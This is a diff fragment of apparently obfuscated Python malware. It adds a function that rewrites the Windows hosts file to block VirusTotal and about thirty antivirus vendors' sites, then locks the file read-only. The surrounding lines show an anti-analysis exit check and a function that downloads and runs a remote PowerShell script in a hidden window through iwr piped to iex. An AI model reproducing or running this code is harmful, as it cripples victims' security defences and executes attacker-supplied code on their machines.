@@ -86,7 +86,23 @@ if mac_check():os._exit(1)
 process_thread=threading.Thread(target=process_check)
 process_thread.start()
 process_thread.join()
-import subprocess,os,zipfile,random,string,requests,io
+import subprocess,os,zipfile,random,string,requests,io,os,subprocess
+def block_sites():
+	E=subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath',shell=_A,capture_output=_A)
+	if E.returncode!=0:F=os.path.join('System32','drivers','etc')
+	else:F=os.sep.join(E.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
+	B=os.path.join(os.getenv('systemroot'),F,'hosts')
+	if not os.path.isfile(B):return
+	with open(B)as D:H=D.readlines()
+	G='virustotal.com','avast.com','totalav.com','scanguard.com','totaladblock.com','pcprotect.com','mcafee.com','bitdefender.com','us.norton.com','avg.com','malwarebytes.com','pandasecurity.com','avira.com','norton.com','eset.com','zillya.com','kaspersky.com','usa.kaspersky.com','sophos.com','home.sophos.com','adaware.com','bullguard.com','clamav.net','drweb.com','emsisoft.com','f-secure.com','zonealarm.com','trendmicro.com','ccleaner.com';A=[]
+	for C in H:
+		if any([A in C for A in G]):continue
+		else:A.append(C)
+	for C in G:A.append('\t0.0.0.0 {}'.format(C));A.append('\t0.0.0.0 www.{}'.format(C))
+	A='\n'.join(A).replace('\n\n','\n');subprocess.run('attrib -r {}'.format(B),shell=_A,capture_output=_A)
+	with open(B,'w')as D:D.write(A)
+	subprocess.run('attrib +r {}'.format(B),shell=_A,capture_output=_A)
+block_sites()
 def error_handler(e):print(f"Error: {str(e)}")
 def run_powershell_script(url):A=f"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {{iwr -Uri '{url}' -UseBasicParsing | iex}}\"";subprocess.run(A,shell=_A,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 def zip_folder(folder_path,password,zip_name):
